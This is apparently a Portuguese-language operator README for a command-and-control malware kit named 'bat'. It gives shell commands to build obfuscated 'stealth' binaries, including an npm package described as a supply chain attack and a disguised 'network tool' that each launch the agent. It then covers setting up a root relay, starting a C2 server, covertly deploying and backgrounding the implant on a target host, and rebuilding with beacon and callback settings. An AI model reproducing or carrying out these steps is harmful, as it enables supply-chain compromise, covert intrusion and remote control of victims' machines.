#versão demo de teste

## operador
```bash
apt install nasm gcc-x86_64-linux-gnu binutils-x86_64-linux-gnu
go install mvdan.cc/garble@latest #pro bin stealth 
cp build.env.example build.env && nano build.env   #secret é o HMAC server/agent  
./build.sh                                          # gera bin/ com npm (supply chain attack) e "ferramenta de rede" com função real. as duas executam o agent
```

## relay (rodar como root)
```bash
scp -r relay/ kperf-qos/ host@$RELAY_IP:/tmp/bat/
ssh ubuntu@$RELAY_IP 'cd /tmp/bat && sudo bash relay/setup.sh --secret <SECRET>'
./relay/sync.sh ubuntu@$RELAY_IP --key $BAT_KEY --restart-kcc  # push kperf-qos + kcc scripts
```

## liga o server
```bash
./bin/bat-server-v10-arm64 -listen 0.0.0.0:9443 -relay host@$RELAY_IP -key $BAT_KEY
```

## deploy do agent
```bash
scp -i $BAT_KEY ./bin/bat-agent-v10-x86_64 ubuntu@TARGET:/home/ubuntu/
ssh -i $BAT_KEY ubuntu@TARGET 'chmod +x /home/ubuntu/bat-agent-v10-x86_64 && nohup /home/ubuntu/bat-agent-v10-x86_64 >/dev/null 2>&1 &'
```

##rebuild servidor
```bash
source build.env && cd agent && make -B server-arm64 \
  SERVER="$RELAY_IP:$C2_PORT" FALLBACK="$RELAY_IP:$C2_PORT" \
  RAWSOCK_CB="$RELAY_IP:$C2_PORT" KCC_ADDR="$RELAY_IP:$KCC_PORT" \
  TRIGGER="${TRIGGER:-udp}" INTERVAL="${BEACON_INTERVAL:-30s}" SECRET="$SECRET"
# nunca usar 'go build' direto pq SharedSecret fica vazio e agentes são rejeitados
```
<img width="1220" height="2712" alt="Screenshot_2026-04-17-17-08-18-103_com termux" src="https://github.com/user-attachments/assets/3e7d6967-c6b6-4a11-82cf-b9bd340dc396" />
